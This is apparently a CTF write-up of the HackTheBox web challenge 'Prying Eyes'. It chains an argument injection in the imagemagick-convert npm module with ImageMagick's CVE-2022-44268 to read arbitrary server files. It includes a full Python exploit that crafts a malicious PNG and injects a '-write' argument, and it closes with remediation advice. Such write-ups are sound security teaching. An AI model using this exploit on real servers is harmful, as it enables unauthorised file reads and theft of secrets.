---
layout: post
title: "Prying Eyes"
date: 2027-12-27 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, imagemagick, argument-injection, cve-2022-44268, file-read, cwe-88]
---

A Node/Express forum that resizes your uploaded avatar to AVIF with the `imagemagick-convert` npm module. The module builds its `convert` command line by joining every option with spaces and then splitting on spaces again — so a single space inside a value you control turns into brand-new `convert` arguments. That is an [argument injection](https://cwe.mitre.org/data/definitions/88.html), and chaining it with [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268) turns "resize my picture" into "read any file on the box."

## Overview

`POST /forum/post` spreads leftover request-body fields straight into the converter and validates the body with an AJV schema that never sets `additionalProperties: false`. So unexpected keys like `srcFormat` reach ImageMagick untouched. The output format is pinned to AVIF, which strips the metadata trick most people reach for first — so the interesting part is getting the leaked bytes back out.

## The technique

Two bugs, chained.

**Bug 1 — argument injection in `imagemagick-convert@1.0.3`.** The route hands the converter whatever survives destructuring:

```js
const { title, message, parentId, ...convertParams } = req.body;
const processedImage = await convert({ ...convertParams, srcData: req.files.image.data, format: "AVIF" });
```

And the library assembles its process argv like this:

```js
// imagemagick-convert/lib/convert.js
return cmd.join(' ').split(' ');
```

Joining and then splitting on spaces means **any value containing a space becomes multiple argv tokens**. The composed command is roughly:

```
convert -density 600 -background <bg> -gravity Center -quality 75 <origin> AVIF:-
```

where the input specifier is built as `` `${srcFormat}:-` ``. Inject through `srcFormat` and you get to place tokens around the input image.

**Bug 2 — [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268) (ImageMagick 7.1.0-33 arbitrary file read).** A PNG carrying a `tEXt` chunk `profile\0<path>` makes ImageMagick's PNG reader open `<path>` and store its bytes as a raw profile while parsing the image. Crucially this read is *not* blocked by the `policy.xml` `path` rights that stop `label:@file` / `-annotate @file` — those emit a stderr line, and the library rejects on **any** stderr (the upload just "fails"). The profile read is silent.

**Why you need both.** The server forces `format: "AVIF"`, and libheif's AVIF encoder strips the raw profile — so the usual CVE-2022-44268 route (download the converted image, read its profile) recovers nothing. The fix is to use the argument injection to `-write` the profile-bearing image as **PNG** into a directory `express.static` serves back to you, *before* the AVIF write. PNG preserves the `Raw profile type` chunk, and the `-write` side effect hits disk even though the trailing phantom token then makes `convert` error out.

Setting `srcFormat` to `- -write /home/node/app/uploads/pwn.png png` produces:

```
convert -density 600 -background none -gravity Center -quality 75 - -write /home/node/app/uploads/pwn.png png:- AVIF:-
```

`-` reads our malicious PNG (flag file → raw profile), `-write .../pwn.png` saves it as PNG, `png:-` then reads empty stdin and errors — but `pwn.png` is already on disk.

## Solution

The full solve registers a user, uploads the crafted PNG with the injected `srcFormat`, fetches the written PNG back, and decodes the profile chunk. The flag value is redacted below — re-run the script to derive it live.

```python
#!/usr/bin/env python3
import sys, struct, zlib, re, os, requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "TARGET:PORT")
FLAG_PATH = "/home/node/app/flag.txt"
UPLOADS_DIR = "/home/node/app/uploads"
USER = "pry" + os.urandom(3).hex()
PASS = "password123"


def chunk(ctype, data):
    return (struct.pack(">I", len(data)) + ctype + data +
            struct.pack(">I", zlib.crc32(ctype + data) & 0xffffffff))


def malicious_png(read_path):
    # 1x1 PNG whose tEXt 'profile' chunk points ImageMagick at read_path (CVE-2022-44268)
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    idat = chunk(b"IDAT", zlib.compress(b"\x00\xff\xff\xff"))
    text = chunk(b"tEXt", b"profile\x00" + read_path.encode())
    return sig + ihdr + text + idat + chunk(b"IEND", b"")


def extract_profile(png):
    o = 8
    while o < len(png):
        ln = struct.unpack(">I", png[o:o + 4])[0]
        typ = png[o + 4:o + 8]
        body = png[o + 8:o + 8 + ln]
        o += 12 + ln
        if typ in (b"tEXt", b"zTXt", b"iTXt"):
            kw, rest = body.split(b"\x00", 1)
            if b"profile" not in kw.lower():
                continue
            if typ == b"zTXt":
                txt = zlib.decompress(rest[1:]).decode("latin1")
            elif typ == b"iTXt":
                txt = rest.split(b"\x00", 3)[-1].decode("latin1")
            else:
                txt = rest.decode("latin1")
            hexpart = "".join(re.findall(r'[0-9a-fA-F]{2}', txt.split("\n", 3)[-1]))
            if hexpart:
                return bytes.fromhex(hexpart).decode("latin1")
        if typ == b"IEND":
            break
    return ""


s = requests.Session()
s.post(f"{BASE}/auth/register", data={"username": USER, "password": PASS})
s.post(f"{BASE}/auth/login", data={"username": USER, "password": PASS})

out_name = "pwn" + os.urandom(4).hex() + ".png"
src_format = f"- -write {UPLOADS_DIR}/{out_name} png"   # the argument injection

s.post(f"{BASE}/forum/post",
       data={"title": "prying", "message": "reading", "srcFormat": src_format},
       files={"image": ("x.png", malicious_png(FLAG_PATH), "image/png")},
       allow_redirects=False)

png = s.get(f"{BASE}/uploads/{out_name}").content
flag = re.search(r"HTB\{[^}]+\}", extract_profile(png))
print("[+] FLAG:", flag.group(0) if flag else "not found")
```

```
[+] FLAG: HTB{...}
```

A couple of debugging notes that made the difference: success versus failure is visible in the redirect target (`/forum/post/<id>` = ok, `/forum` = the converter rejected on stderr), and a multi-frame AVIF write *also* emits stderr — which is exactly why the single-`-write`-then-error path is the clean one.

## Why it worked

The converter treats untrusted request fields as trusted CLI arguments because the wrapper library flattens everything to a single space-delimited string and re-splits it. The AJV schema's missing `additionalProperties: false` is what let the extra `srcFormat` key reach that sink at all. ImageMagick's own PNG-profile file read (CVE-2022-44268) supplies the silent read primitive, and a servable output directory supplies the exfil channel.

## Fix / defense

- Upgrade ImageMagick to ≥ 7.1.0-49 (patches [CVE-2022-44268](https://nvd.nist.gov/vuln/detail/CVE-2022-44268)) and lock down `policy.xml` to deny path/`@` reads and strip profiles.
- Never spread untrusted request fields into an argv builder — whitelist a fixed set of options (`rotate`, `flip`, …).
- Set AJV `additionalProperties: false` so unexpected keys are rejected outright.
- Avoid `imagemagick-convert@1.0.3` (the `join(' ').split(' ')` builder); prefer `sharp`/libvips bindings that never shell out.
